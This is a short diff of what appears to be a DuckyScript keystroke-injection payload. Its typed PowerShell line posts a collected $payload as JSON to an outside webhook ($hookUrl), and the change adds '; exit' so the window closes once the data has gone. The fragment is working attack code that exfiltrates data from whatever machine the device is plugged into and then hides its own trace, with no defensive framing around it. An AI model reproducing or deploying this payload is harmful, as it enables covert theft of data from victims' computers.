@@ -30,5 +30,5 @@ DELAY 1000
 STRING }
 ENTER
 DELAY 1000
-STRING Invoke-RestMethod -Uri $hookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'Application/Json'
+STRING Invoke-RestMethod -Uri $hookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'Application/Json'; exit
 ENTER
